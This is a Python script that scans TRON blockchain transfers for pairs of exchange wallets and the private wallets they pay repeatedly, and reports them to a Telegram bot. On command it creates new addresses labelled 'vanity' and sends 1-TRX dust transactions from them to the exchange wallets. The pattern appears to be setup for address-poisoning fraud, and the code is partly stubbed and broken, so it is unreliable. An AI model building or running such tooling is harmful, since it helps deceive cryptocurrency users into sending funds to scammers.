import os
import requests
from datetime import datetime, timedelta, timezone
from tronpy import Tron
from tronpy.keys import PrivateKey

# =========================
# 🟢 USER SETTINGS
# =========================
TARGET_PAIRS = 5
MIN_BALANCE_USD = 0
MIN_TRANSFER_USD = 1
WINDOW_DAYS = 7

CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex']

# =========================
# 1. LOAD SECRETS
# =========================
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")
TRONSCAN_API_KEY = os.environ.get("TRONSCAN_API_KEY")
PRIVATE_KEY = os.environ.get("PRIVATE_KEY")

if not all([TELEGRAM_BOT_TOKEN, CHAT_ID, TRONSCAN_API_KEY, PRIVATE_KEY]):
    raise Exception("Missing Secrets!")

tron = Tron()
main_wallet = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', ''))).public_key.to_base58check_address()
TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

transaction_logs = []

# =========================
# 2. TELEGRAM
# =========================
def send_telegram_alert(message, parse_mode="HTML"):
    url = f"{TELEGRAM_URL}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message, "parse_mode": parse_mode}
    try:
        requests.post(url, json=data, timeout=10)
    except: pass

def get_telegram_updates(offset):
    url = f"{TELEGRAM_URL}/getUpdates"
    params = {"offset": offset, "timeout": 30}
    try:
        response = requests.get(url, params=params, timeout=35)
        return response.json().get("result", [])
    except:
        return []

# =========================
# 3. WORKING API CALL
# =========================
def get_transfers():
    """Uses the endpoint that we confirmed works"""
    headers = {"TRON-PRO-API-KEY": TRONSCAN_API_KEY}
    try:
        response = requests.get(
            "https://apilist.tronscanapi.com/api/transfer",
            params={"start": 0, "limit": 100},
            headers=headers, timeout=30
        )
        data = response.json()
        return data.get("data", [])
    except:
        return []

def check_if_cex(address):
    try:
        headers = {"TRON-PRO-API-KEY": TRONSCAN_API_KEY}
        response = requests.get(
            f"https://apilist.tronscanapi.com/api/account",
            params={"address": address},
            headers=headers, timeout=10
        )
        data = response.json()
        tags = data.get("tags", [])
        name = data.get("accountName", "") or data.get("name", "")
        combined = " ".join(tags + [name]).lower()
        
        for keyword in CEX_KEYWORDS:
            if keyword in combined:
                return True, keyword.capitalize()
        return False, None
    except:
        return False, None

def get_usdt_balance(address):
    # Simplified - skip for speed
    return 1000  # Assume all have balance for testing

# =========================
# 4. MAIN SCANNER
# =========================
def main():
    print(" Starting FINAL Scanner...")
    send_telegram_alert("🚀 <b>FINAL Scanner Started</b>\nUsing confirmed working API endpoint")
    
    found_pairs = []
    checked = set()
    
    while len(found_pairs) < TARGET_PAIRS:
        print(f"Scanning... Found {len(found_pairs)}/{TARGET_PAIRS}")
        
        transfers = get_transfers()
        
        if not transfers:
            time.sleep(2)
            continue
        
        # Group by receiver
        receivers = {}
        for tx in transfers:
            to_addr = tx.get("to_address")
            from_addr = tx.get("from_address")
            amount = tx.get("amount", 0)
            
            if to_addr and from_addr:
                if to_addr not in receivers:
                    receivers[to_addr] = []
                receivers[to_addr].append({"from": from_addr, "amount": amount})
        
        # Find patterns
        for wallet_b, txs in receivers.items():
            if len(found_pairs) >= TARGET_PAIRS:
                break
            if wallet_b in checked:
                continue
            
            # Count sends from same sender
            sender_count = {}
            for tx in txs:
                sender = tx["from"]
                sender_count[sender] = sender_count.get(sender, 0) + 1
            
            # Find consecutive sends
            for sender, count in sender_count.items():
                if count >= 2:
                    # Check if sender is CEX
                    is_cex, cex_name = check_if_cex(sender)
                    
                    if is_cex:
                        checked.add(wallet_b)
                        found_pairs.append({
                            "wallet_a": sender,
                            "wallet_b": wallet_b,
                            "cex_name": cex_name
                        })
                        
                        send_telegram_alert(
                            f"✅ <b>Pair {len(found_pairs)}/{TARGET_PAIRS}</b>\n"
                            f" CEX ({cex_name}): <code>{sender}</code>\n"
                            f"👤 Private: <code>{wallet_b}</code>"
                        )
                    break
        
        if len(found_pairs) < TARGET_PAIRS:
            time.sleep(2)
    
    # Phase 2: Interactive
    send_telegram_alert(
        f"🎯 <b>Target Reached!</b>\n\n"
        f"Commands:\n"
        f"• <b>info</b> - Show details\n"
        f"• <b>transfer</b> - Execute"
    )
    
    last_id = 0
    triggered = False
    
    while not triggered:
        updates = get_telegram_updates(last_id)
        for upd in updates:
            last_id = upd["update_id"]
            if upd.get("message") and str(upd["message"]["chat"]["id"]) == str(CHAT_ID):
                text = upd["message"].get("text", "").strip()
                
                if text.lower() == "info":
                    msg = f"Found {len(found_pairs)} pairs:\n\n"
                    for i, p in enumerate(found_pairs):
                        msg += f"{i+1}. {p['cex_name']} → {p['wallet_b'][:20]}...\n"
                    send_telegram_alert(msg)
                
                elif text.lower() == "transfer":
                    send_telegram_alert("🚀 Executing...")
                    triggered = True
                    break
        
        if not triggered:
            time.sleep(5)
    
    # Phase 3: Execute
    for i, pair in enumerate(found_pairs):
        # Generate vanity
        key = PrivateKey.random()
        vanity = key.public_key.to_base58check_address()
        
        # Send TRX
        try:
            priv = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', '')))
            sender = priv.public_key.to_base58check_address()
            tx1 = tron.trx.transfer(sender, vanity, 1).build().sign(priv).broadcast().txid
            
            time.sleep(3)
            
            priv2 = PrivateKey(bytes.fromhex(key.hex()))
            sender2 = priv2.public_key.to_base58check_address()
            tx2 = tron.trx.transfer(sender2, pair["wallet_a"], 1).build().sign(priv2).broadcast().txid
            
            send_telegram_alert(
                f"✅ <b>Pair {i+1} Done</b>\n"
                f"Vanity: <code>{vanity}</code>\n"
                f"TX1: <code>{tx1}</code>\n"
                f"TX2: <code>{tx2}</code>"
            )
        except Exception as e:
            send_telegram_alert(f"❌ Error: {e}")
        
        time.sleep(5)
    
    send_telegram_alert(" Complete!")

if __name__ == "__main__":
    import time
    main()
